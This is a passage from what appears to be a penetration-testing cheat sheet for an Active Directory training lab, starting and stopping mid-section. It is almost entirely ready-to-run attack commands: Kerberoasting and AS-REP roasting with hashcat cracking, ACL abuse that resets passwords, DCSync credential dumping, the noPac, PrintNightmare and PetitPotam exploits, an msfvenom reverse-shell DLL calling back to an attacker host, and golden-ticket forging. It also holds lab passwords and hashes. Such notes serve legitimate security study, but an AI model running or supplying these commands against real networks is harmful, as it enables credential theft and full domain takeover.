dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
Looks for Domain Controllers in the current environment, limiting the results to five.
#domaincontroller #domaininfo #enumeration  ^dddee8

## Kerberoasting

### Linux

#### List SPN Accounts with GetUserSPNs.py
```Shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday
```
Impacket tool used to get a list of SPNs on the target Windows domain from a Linux-based host.
#spn #serviceprincipalname #kerberoasting #enumeration  ^c4b6aa

#### Request all TGS Tickets
```Shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request
```
Impacket tool used to download/request (-request) all TGS tickets for offline processing from a Linux-based host.
#tickets #tgs  ^180b1a

#### Requesting a Single TGS ticket
```Shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev
```
Impacket tool used to download/request (-request-user) a TGS ticket for a specific user account (sqldev) from a Linux-based host.
#tickets #tgs  ^180b1a

#### Save the TGS Ticket to an Output File
```Shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
```
Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
#tickets #tgs  ^180b1a

#### Crack the Ticket Offline with Hashcat
```cmd
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
```
Attempts to crack the Kerberos (-m 13100) ticket hash (sqldev_tgs) using hashcat and a wordlist (rockyou.txt) from a Linux-based host.
#hashcat #tgs #tickets #passwordattacks  ^8d687d


### Windows - Manual Method

#### Enumerate SPNs with setspn.exe
```cmd
setspn.exe -Q */*
```
Enumerates SPNs w/ setspn binary in CMD shell
#kerberoasting #spn #serviceprincipalname #enumeration  ^5e1919

#### Requesting a Single TGS ticket
```PowerShell
Add-Type -AssemblyName System.IdentityModel
```

```PowerShell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
Requests TGS tickets for an account in the shell above and loads them into memory
#tgs #tickets #kerberoasting  ^f5d0eb

#### Retrieve All Tickets Using setspn.exe
```PowerShell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
Retrieves all tickets in the domain
#tgs #tickets #kerberoasting 


### Extracting Tickets from Memory with Mimikatz

```cmd.exe
mimikatz # base64 /out:true
```
```cmd.exe
mimikatz # kerberos::list /export 
```
Displays tickets in base64 format, which can be decoded afterward  ^c4015f

#### Prepare the base64 blob for cracking
```Shell
echo "<base64 blob>" |  tr -d \\n
```
Displays the output in base64 for preparation to be placed in a .kirbi file

#### Place the Output into a File as .kirbi
```Shell
cat encoded_file | base64 -d > sqldev.kirbi
```

#### Extract the Kerberos Ticket using kirbi2john.py
```Shell
python2.7 kirbi2john.py sqldev.kirbi
```
Extracts ticket and places it in a file called `crack_file`, which then must be modified to use w/ hashcat

#### Modifiy crack_file for Hashcat
```Shell
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
Saves the output to sqldev_tgs_hashcat

#### Crackthe Hash with Hashcat
```cmd.exe
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt --force
```
Cracks the hash w/ hashcat
#hashcat #tgs #tickets #kerberoasting  ^3a8c7a


### Windows - Automated / Tool Based Route

#### Use PowerView to Extract TGS Tickets
```PowerShell
Import-Module .\PowerView.ps1
```
Imports PowerView module

```PowerShell
Get-DomainUser * -spn | select samaccountname 
```
Uses PowerView tool to extract TGS Tickets. This displays the users with SPNs.  ^ea9027

#### Target a Specific User
```PowerShell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host. ^6ec73d

#### Can Export All Tickets to a CSV File
```PowerShell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation 
```
Exports all TGS tickets to a .CSV file (ilfreight_tgs.csv) from a Windows-based host.

#### To View the Contents of the .CSV File
```PowerShell
cat .\ilfreight_tgs.csv 
```
Used to view the contents of the .csv file from a Windows-based host

### Kerberoasting with Rubeus

#### Using the /stats Flag
```PowerShell
.\Rubeus.exe kerberoast /stats
```
Used to check the kerberoast stats (/stats) within the target Windows domain from a Windows-based host.

#### Using the /nowrap Flag
```PowerShell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
Used to request/download TGS tickets for accounts with the admin count set to 1 then formats the output in an easy to view & crack manner (/nowrap) . Performed from a Windows-based host. ^9275d4

```PowerShell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```
Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.

```PowerShell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes 
```
PowerView tool used to check the msDS-SupportedEncryptionType attribute associated with a specific user account (testspn). Performed from a Windows-based host.

#### Cracking the Ticket with Hashcat & rockyou.txt
```cmd.exe
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```
Used to attempt to crack the ticket hash using a wordlist (rockyou.txt) from a Linux-based host . ^8ec83f


## ACL Enumeration & Attacks

#### Find-InterestingDomainAcl
```PowerShell
Find-InterestingDomainAcl
```
PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host. *Not the most efficient method.*

#### Convert SamAccountName to SID 
```PowerShell
Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley
```
Used to retrieve the SID of a specific user account (wley) from a Windows-based host. This will allow a targeted search using Get-DomainObjectACL.

#### Using Get-DomainObjectACL
```PowerShell
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
Used to find all Windows domain objects that the user has rights over by mapping the user's SID to the SecurityIdentifier property from a Windows-based host.

#### Performing a Reverse Search & Mapping to a GUID Value
```PowerShell
$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl
```
Used to perform a reverse search & map to a GUID value from a Windows-based host. *Not efficient. -ResolveGUIDs in PowerView is better.*

#### Using the -ResolveGUIDs Flag
```PowerShell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
Used to discover a domain object's ACL by performing a search based on GUID's (-ResolveGUIDs) from a Windows-based host. Will show ObjectAceType, which will inform us what rights users have within the group.

#### Creating a List of Domain Users
```PowerShell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
Used to discover a group of user accounts in a target Windows domain and add the output to a text file (ad_users.txt) from a Windows-based host. More ideal method than what was previously shown.

#### A Useful foreach Loop
```PowerShell
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
A foreach loop used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(ad_users.txt) to the Get-ADUser cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.

### Changing a User's Password
*Works with ObjectAceType User-Force-Change-Password and GenericAll*

```PowerShell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```
Used to create a PSCredential Object from a Windows-based host. Will allow you to log in with the user that has ACL rights in the targeted group.

```PowerShell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
Used to create a SecureString Object from a Windows-based host.

#### Changing the password of a user
```PowerShell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.

### Adding a member to a domain 
*For ObjectAceTypes GenericWrite and GenericAll*

```PowerShell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```
PowerView tool used view the members of a target security group (Help Desk Level 1) from a Windows-based host.

#### Adding the member
```PowerShell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```
PowerView tool used to add a specifc user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.

#### Checking to see if they were successfully added
```PowerShell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```
PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.

#### Creating a fake SPN to imitate the account with group rights
```PowerShell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
PowerView tool used create a fake Service Principal Name given a specific user (adunn) from a Windows-based host.

*Look for `DS-Replication-Get-Changes` or `DS-Replication-Get-Changes-In-Filtered`. This will allow the user to perform a DCSync Attack.*

### Undoing the attack
```PowerShell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
PowerView tool used to remove the fake Service Principal Name created during the attack from a Windows-based host.

```PowerShell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
PowerView tool used to remove a specific user (damundsent) from a specific security group (Help Desk Level 1) from a Windows-based host.

```PowerShell
ConvertFrom-SddlString
```
PowerShell cmd-let used to covert an SDDL string into a readable format. Performed from a Windows-based host.

## DCSync

#### Using Get-DomainUser to View a user's Group Membership
```PowerShell
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol |fl
```
PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.

#### Using Get-ObjectAcl to Check a user's Replication Rights
```PowerShell
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool Get-ObjectAcl to check a specific user's replication rights. Performed from a Windows-based host.

*If the user has replication rights*

#### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
```Shell
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss
```
Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (172.16.5.5) and save the extracted hashes to an file (inlanefreight_hashes). Performed from a Linux-based host.

#### Performing the DCSync Attack with Mimikatz
```cmd.exe
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
Uses Mimikatz to perform a dcsync attack from a Windows-based host.

## Privileged Access

#### Enumerating the Remote Desktop Users Group
```PowerShell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
PowerView based tool to used to enumerate the Remote Desktop Users group on a Windows target (-ComputerName ACADEMY-EA-MS01) from a Windows-based host.

#### Enumerating the Remote Management Users Group
```PowerShell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```
PowerView based tool to used to enumerate the Remote Management Users group on a Windows target (-ComputerName ACADEMY-EA-MS01) from a Windows-based host.

#### Establishing WinRM Session from Windows
```PowerShell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
```
Creates a variable ($password) set equal to the password (Klmcargo2) of a user from a Windows-based host.

```PowerShell
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
```
Creates a variable ($cred) set equal to the username (forend) and password ($password) of a target domain account from a Windows-based host.

```PowerShell
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```
Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).

#### Connecting to a Target with Evil-WinRM and Valid Credentials
```Shell
evil-winrm -i 10.129.201.234 -u forend
```
Used to establish a PowerShell session with a Windows target from a Linux-based host using WinRM.

### SQL Server Admin

#### Hunting for SQL server instances
```PowerShell
Import-Module .\PowerUpSQL.ps1
```
Used to import the PowerUpSQL tool.

```PowerShell
Get-SQLInstanceDomain
```
PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.

```PowerShell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```
PowerUpSQL tool used to connect to connect to a SQL server and query the version (-query 'Select @@version') from a Windows-based host.

#### Running mssqlclient.py Against the Target
```Shell
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```
Impacket tool used to connect to a MSSQL server from a Linux-based host.

```Shell
help
```
Used to display mssqlclient.py options once connected to a MSSQL server.

#### Choosing enable_xp_cmdshell
```Shell
enable_xp_cmdshell
```
Used to enable xp_cmdshell stored procedure that allows for executing OS commands via the database from a Linux-based host.

```Shell
xp_cmdshell whoami /priv
```
Used to enumerate rights on a system using xp_cmdshell.
## Kerberos Double Hop

#### Problem Identification
```PowerShell
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
```
Authenticates over WinRM w/ backupadm

```PowerShell
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```
Runs Mimikatz to determine if backupadm's credentials exist in memory. If they don't, the TGT has not been sent to the remote session.

```PowerShell
tasklist /V |findstr backupadm
```
Searches processes running in the context of the backupadm user

#### Workaround #1: PSCredential Object in EvilWinRM
```PowerShell
Import-Module .\PowerView.ps1
```
Evil-WinRM command to import PowerView. Will show process isn't able to be executed.

```PowerShell
klist
```
Will show there is only a cached Kerberos ticket for our user

```PowerShell
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
```
Sets up a PSCredential object

```PowerShell
get-domainuser -spn -credential $Cred | select samaccountname
```
Queries SPN accounts using PowerView, which should be successful because we passed our credentials along with the command

#### Workaround #2: Register PSSession Configuration
```PowerShell
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```
Establishes a WinRM session on the remote host

```PowerShell
klist
```
Will show there is only a cached Kerberos ticket for our user

```PowerShell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```
Registers a new session configuration using the Register-PSSessionConfiguration cmdlet.

```PowerShell
Restart-Service WinRM
```
Service needs to be restarted

```PowerShell
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
```
Re-enters the session under the new configuration created
## Bleeding Edge Vulnerabilities

### NoPac

#### Cloning the NoPac Exploit Repo
```Shell
sudo git clone https://github.com/Ridter/noPac.git 
```
Used to clone a noPac exploit using git. Performed from a Linux-based host.

#### Scanning for NoPac
```Shell
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap 
```
Runs scanner.py to check if a target system is vulnerable to noPac/Sam_The_Admin from a Linux-based host.

#### Running NoPac & Getting a Shell
```Shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap 
```
Used to exploit the noPac/Sam_The_Admin vulnerability and gain a SYSTEM shell (-shell). Performed from a Linux-based host.

#### Using noPac to DCSync the Built-in Administrator Account
```Shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator 
```
Used to exploit the noPac/Sam_The_Admin vulnerability and perform a DCSync attack against the built-in Administrator account on a Domain Controller from a Linux-based host.

### PrintNightmare

#### Cloning the Exploit
```Shell
git clone https://github.com/cube0x0/CVE-2021-1675.git
```
Used to clone a PrintNightmare exploit using git from a Linux-based host.

#### Install cube0x0's Version of Impacket
```Shell
pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install
```
Used to ensure the exploit author's (cube0x0) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.

#### Enumerating for MS-RPRN
```Shell
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
Used to check if a Windows target has MS-PAR & MSRPRN exposed from a Linux-based host.

#### Generating a DLL Payload
```Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll
```
Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.

#### Creating a Share with smbserver.py
```Shell
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```
Used to create an SMB server and host a shared folder (CompData) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.

#### *Configure & Start an MSF multi/handler*

#### Running the Exploit
```Shell
sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'
```
Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.

### PetitPotam (MS-EFSRPC)

#### Starting ntlmrelayx.py
```Shell
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
Impacket tool used to create an NTLM relay by specifiying the web enrollment URL for the Certificate Authority host. Perfomred from a Linux-based host.

#### Cloning PetitPotam.py
```Shell
git clone https://github.com/topotam/PetitPotam.git
```
Used to clone the PetitPotam exploit using git. Performed from a Linux-based host.

#### Running PetitPotam.py
```Shell
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```
Used to execute the PetitPotam exploit by specifying the IP address of the attack host (172.16.5.255) and the target Domain Controller (172.16.5.5). Performed from a Linux-based host.

#### *ntlmrelayx.py Should Catch a Base64 Encoded Certificate for DC01*

#### Requesting a TGT Using gettgtpkinit.py
```Shell
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache
```
Uses gettgtpkinit.py to request a TGT ticket for the Domain Controller (dc01.ccache) from a Linux-based host.

#### Setting the KRB5CCNAME Environment Variable
```shell-session
export KRB5CCNAME=dc01.ccache
```
The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.

#### Using Domain Controller TGT to DCSync
```Shell
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
Impacket tool used to perform a DCSync attack and retrieve one or all of the NTLM password hashes from the target Windows domain. Performed from a Linux-based host.

#### Running klist
```Shell
klist
```
krb5-user command used to view the contents of the ccache file. Performed from a Linux-based host.

#### Submitting a TGS Request for Ourselves Using getnthash.py
```Shell
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
Used to submit TGS requests using getnthash.py from a Linux-based host.

#### Using Domain Controller NTLM Hash to DCSync
```Shell
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```
Impacket tool used to extract hashes from NTDS.dit using a DCSync attack and a captured hash (-hashes). Performed from a Linux-based host.

#### Requesting TGT and Performing PTT with DC01$ Machine Account
```PowerShell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt
```
Uses Rubeus to request a TGT and perform a pass-the-ticket attack using the machine account (/user:ACADEMY-EA-DC01$) of a Windows target. Performed from a Windows-based host.

#### Performing DCSync with Mimikatz
```PowerShell
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```
Performs a DCSync attack using Mimikatz. Performed from a Windows-based host.
## Miscellaneous Misconfigurations

#### Enumerating for MS-PRN Printer Bug
```Shell
Import-Module .\SecurityAssessment.ps1
```
Used to import the module `Security Assessment.ps1`. Performed from a Windows-based host.

```PowerShell
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
SecurityAssessment.ps1 based tool used to enumerate a Windows target for `MS-PRN Printer bug`. Performed from a Windows-based host.

#### Using adidnsdump
```Shell
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```
Used to resolve all records in a DNS zone over `LDAP` from a Linux-based host.

```Shell
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```
Used to resolve unknown records in a DNS zone by performing an `A query` (`-r`) from a Linux-based host.

#### Finding Passwords in the Description Field using Get-Domain User
```PowerShell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
PowerView tool used to display the description field of select objects (`Select-Object`) on a target Windows domain from a Windows-based host.

#### Checking for PASSWD_NOTREQD Setting using Get-DomainUser
```PowerShell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
PowerView tool used to check for the `PASSWD_NOTREQD` setting of select objects (`Select-Object`) on a target Windows domain from a Windows-based host.

#### Discovering an Interesting Script
```PowerShell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```
Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.

### Group Policy Preferences (GPP) Passwords

#### *View the Groups.xml file (cpassword)*

GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value.

#### Decrypting the Password with gpp-decrypt
```Shell
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

#### Locating & Retrieving GPP Passwords with CrackMapExec
```Shell
crackmapexec smb -L | grep gpp
```

#### Using CrackMapExec's gpp_autologin Module
```Shell
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

### ASREPRoasting
If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again.

#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
```PowerShell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

#### Retrieving AS-REP in Proper Format using Rubeus
```PowerShell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

#### Cracking the Hash Offline with Hashcat
```cmd.exe
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
```

#### Retrieving the AS-REP Using Kerbrute
```Shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

#### Hunting for Users with Kerberoast Pre-auth Not Required
```Shell
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

### Group Policy Object (GPO) Abuse

#### Enumerating GPO Names with PowerView
```PowerShell
Get-DomainGPO |select displayname
```

#### Enumerating GPO Names with a Built-In Cmdlet
```PowerShell
Get-GPO -All | Select DisplayName
```

#### Enumerating Domain User GPO Rights
```PowerShell
$sid=Convert-NameToSid "Domain Users"
```

```PowerShell
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

#### Converting GPO GUID to Name
```PowerShell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

## Trust Relationships - Child > Parent Trusts

### From Windows

#### Using Get-ADTrust
```PowerShell
Import-Module .\Import-ActiveDirectory.ps1
```

```PowerShell
Import-Module .\Microsoft.ActiveDirectory.Management.dll
```
Used to import the `Active Directory` module. Performed from a Windows-based host.

```PowerShell
Get-ADTrust -Filter *
```
PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.

#### Checking for Existing Trusts using Get-DomainTrust
```PowerShell
Get-DomainTrust
```
PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.

#### Using Get-DomainTrustMapping
```PowerShell
Get-DomainTrustMapping
```
PowerView tool used to perform a domain trust mapping from a Windows-based host.

#### Checking Users in the Child Domain using Get-DomainUser
```PowerShell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```
PowerView tools used to enumerate users in a target child domain from a Windows-based host.

### ExtraSids Attack - Mimikatz

#### Obtaining the KRBTGT Account's NT Hash using Mimikatz
```PowerShell
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```
Uses Mimikatz to obtain the `KRBTGT` account's `NT Hash` from a Windows-based host.

#### Using Get-DomainSID
```PowerShell
Get-DomainSID
```
PowerView tool used to get the SID for a target child domain from a Windows-based host.

#### Obtaining Enterprise Admins Group's SID using Get-DomainGroup
```PowerShell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
PowerView tool used to obtain the `Enterprise Admins` group's SID from a Windows-based host.

#### Using `ls` to Confirm No Access
```PowerShell
ls \\academy-ea-dc01.inlanefreight.local\c$
```
Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.

#### Creating a Golden Ticket with Mimikatz
```PowerShell
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
Uses `Mimikatz` to create a `Golden Ticket` from a Windows-based host .

### ExtraSids Attack - Rubeus

#### Creating a Golden Ticket using Rubeus
```PowerShell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
Uses `Rubeus` to create a `Golden Ticket` from a Windows-based host.

#### Performing a DCSync Attack
```PowerShell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```
Uses `Mimikatz` to perform a DCSync attack from a Windows-based host.

### From Linux

#### Performing DCSync with secretsdump.py
```Shell
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
Impacket tool used to perform a DCSync attack from a Linux-based host.

#### Performing SID Brute Forcing using lookupsid.py
```Shell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```
Impacket tool used to perform a `SID Brute forcing` attack from a Linux-based host.

#### Looking for the Domain SID
```Shell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```
Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.

#### Grabbing the Domain SID & Attaching to Enterprise Admin's RID
```Shell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
Impacket tool used to retrieve the `SID` of a target Windows domain and attach it to the Enterprise Admin group's `RID` from a Linux-based host.

#### Constructing a Golden Ticket using ticketer.py
```Shell
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
Impacket tool used to create a `Golden Ticket` from a Linux-based host.

#### Setting the KRB5CCNAME Environment Variable
```Shell
export KRB5CCNAME=hacker.ccache
```
Used to set the `KRB5CCNAME Environment Variable` from a Linux-based host.

#### Getting a SYSTEM shell using Impacket's psexec.py
```Shell
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.

#### Performing the Attack with raiseChild.py
```Shell
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
Impacket tool that automatically performs an attack that escalates from child to parent domain.


## Trust Relationships - Cross-Forest

### Cross-Forest Kerberoasting - Windows

#### Enumerating Accounts for Associated SPNs Using Get-DomainUser
```PowerShell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
PowerView tool used to enumerate accounts for associated `SPNs` from a Windows-based host.

#### Enumerating the mssqlsvc Account
```PowerShell
